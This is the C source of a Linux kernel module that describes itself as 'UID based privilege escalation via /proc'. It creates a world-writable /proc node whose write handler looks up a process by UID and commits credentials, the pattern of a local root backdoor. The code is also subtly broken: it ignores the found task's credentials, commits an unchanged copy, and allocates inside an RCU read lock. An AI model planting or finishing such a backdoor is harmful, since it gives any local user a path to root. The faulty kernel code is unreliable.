#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "uid_priv.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("UID based privilege escalation via /proc");

static ssize_t uid_priv_write(struct file *file,
                              const char __user *ubuf,
                              size_t cnt, loff_t *ppos)
{
    char buf[UID_PRIV_BUF] = {0};
    unsigned long uid_val;
    kuid_t target_uid;
    struct task_struct *task;

    if (cnt == 0 || cnt >= UID_PRIV_BUF)
        return -EINVAL;

    if (copy_from_user(buf, ubuf, cnt))
        return -EFAULT;

    buf[cnt] = '\0';

    if (kstrtoul(buf, 10, &uid_val))
        return -EINVAL;

    target_uid = KUIDT_INIT((uid_t)uid_val);

    rcu_read_lock();

    for_each_process(task) {
        if (uid_eq(task_uid(task), target_uid)) {
            const struct cred *old;
            struct cred *new;

            old = task_cred(task);
            new = prepare_creds();
            if (!new)
                break;

            commit_creds(new);
            break;
        }
    }

    rcu_read_unlock();

    *ppos += cnt;
    return cnt;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops uid_priv_fops = {
    .proc_write = uid_priv_write,
};
#else
static const struct file_operations uid_priv_fops = {
    .write = uid_priv_write,
};
#endif

int uid_priv_init(void)
{
    if (!proc_create(UID_PRIV_NODE, 0222, NULL, &uid_priv_fops)) {
        printk(KERN_ERR "uid_priv: create proc node failed\n");
        return -ENOMEM;
    }

    printk(KERN_INFO "uid_priv: loaded, node=/proc/" UID_PRIV_NODE "\n");
    return 0;
}

void uid_priv_exit(void)
{
    remove_proc_entry(UID_PRIV_NODE, NULL);
    printk(KERN_INFO "uid_priv: unloaded\n");
}

module_init(uid_priv_init);
module_exit(uid_priv_exit);
